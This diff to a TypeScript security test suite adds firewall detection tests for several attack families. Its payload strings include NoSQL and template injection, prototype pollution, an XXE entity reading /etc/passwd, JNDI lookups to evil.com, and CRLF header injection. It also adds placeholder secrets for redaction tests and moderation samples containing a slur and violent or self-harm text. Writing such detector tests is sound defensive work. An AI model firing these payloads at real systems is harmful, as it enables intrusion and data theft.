@@ -1,6 +1,6 @@
 // tests/security-evals.ts
 import assert from 'assert';
-import { WafFirewall, DlpScanner, IpFirewall } from '@/lib/security-firewall';
+import { WafFirewall, DlpScanner, IpFirewall, ContentModerationScanner } from '@/lib/security-firewall';
 import { PromptInjectionDetector } from '@/lib/clawpatrol/prompt-injection-detector';
 import { encryptLead, decryptLead } from '@/lib/security';
 
@@ -58,6 +58,50 @@ export async function runSecurityEvals() {
     "|| powershell -Command \"Get-Process\""
   ];
 
+  const nosqlPayloads = [
+    "{ \"$ne\": null }",
+    "{ \"$gt\": \"\" }",
+    "admin' || '1'=='1"
+  ];
+
+  const prototypePollutionPayloads = [
+    "__proto__",
+    "constructor.prototype",
+    "{\"__proto__\": {\"polluted\": true}}"
+  ];
+
+  const sstiPayloads = [
+    "{{ 7 * 7 }}",
+    "${7*7}",
+    "${class.module.classLoader}"
+  ];
+
+  const xxePayloads = [
+    "<!ENTITY xxe SYSTEM \"file:///etc/passwd\">",
+    "<!DOCTYPE foo [ <!ENTITY xxe SYSTEM \"http://127.0.0.1\"> ]>"
+  ];
+
+  const jndiPayloads = [
+    "${jndi:ldap://evil.com/a}",
+    "${jndi:rmi://evil.com/b}"
+  ];
+
+  const crlfPayloads = [
+    "some\r\nSet-Cookie: session=evil",
+    "value\r\nLocation: http://malicious.com"
+  ];
+
+  const moderationUnsafePayloads = [
+    "I hate you and want to kill everyone",
+    "this faggot behavior is unacceptable",
+    "how to commit suicide with a bomb"
+  ];
+
+  const moderationSafePayloads = [
+    "Hello my friend, hope you are doing well",
+    "Just standard feedback, thank you"
+  ];
+
   const benignPayloads = [
     "Hello world, this is a normal search query.",
     "User inquiry about DealFlow AI features and plans.",
@@ -105,6 +149,67 @@ export async function runSecurityEvals() {
       assert.strictEqual(result.isMalicious, true, `Failed to block Command Injection: ${payload}`);
       if (result.isMalicious) wafTruePositives++;
       else wafFalseNegatives++;
+    }
+  });
+
+  runTest('WAF: NoSQL Injection detection', () => {
+    for (const payload of nosqlPayloads) {
+      assert.strictEqual(WafFirewall.scanString(payload).isMalicious, true, `Failed to block NoSQL: ${payload}`);
+    }
+  });
+
+  runTest('WAF: Prototype Pollution detection', () => {
+    for (const payload of prototypePollutionPayloads) {
+      assert.strictEqual(WafFirewall.scanString(payload).isMalicious, true, `Failed to block Prototype Pollution: ${payload}`);
+    }
+  });
+
+  runTest('WAF: SSTI detection', () => {
+    for (const payload of sstiPayloads) {
+      assert.strictEqual(WafFirewall.scanString(payload).isMalicious, true, `Failed to block SSTI: ${payload}`);
+    }
+  });
+
+  runTest('WAF: XXE detection', () => {
+    for (const payload of xxePayloads) {
+      assert.strictEqual(WafFirewall.scanString(payload).isMalicious, true, `Failed to block XXE: ${payload}`);
+    }
+  });
+
+  runTest('WAF: LDAP/JNDI detection', () => {
+    for (const payload of jndiPayloads) {
+      assert.strictEqual(WafFirewall.scanString(payload).isMalicious, true, `Failed to block JNDI: ${payload}`);
+    }
+  });
+
+  runTest('WAF: CRLF / Header Injection detection', () => {
+    for (const payload of crlfPayloads) {
+      assert.strictEqual(WafFirewall.scanString(payload).isMalicious, true, `Failed to block CRLF: ${payload}`);
+    }
+  });
+
+  runTest('DLP: JWT, AWS API Key, Bearer Token, and IP Leakage redaction', () => {
+    const original = {
+      jwt: 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOiIxMjMifQ.abc-def',
+      aws: 'AKIAIOSFODNN7EXAMPLE',
+      bearer: 'bearer secret_token_value_123',
+      ip: '192.168.1.1'
+    };
+    const redacted = DlpScanner.redactPII(original);
+    assert.ok(redacted.jwt.includes('[REDACTED_JWT]'));
+    assert.ok(redacted.aws.includes('[REDACTED_AWS_API_KEY]'));
+    assert.ok(redacted.bearer.includes('[REDACTED_BEARERTOKEN]'));
+    assert.ok(redacted.ip.includes('[REDACTED_IPADDRESS]'));
+  });
+
+  runTest('Content Moderation: Unsafe text detection', () => {
+    for (const payload of moderationUnsafePayloads) {
+      const check = ContentModerationScanner.scanString(payload);
+      assert.strictEqual(check.isUnsafe, true, `Failed to block unsafe: ${payload}`);
+    }
+    for (const payload of moderationSafePayloads) {
+      const check = ContentModerationScanner.scanString(payload);
+      assert.strictEqual(check.isUnsafe, false, `False positive block: ${payload}`);
     }
   });
 
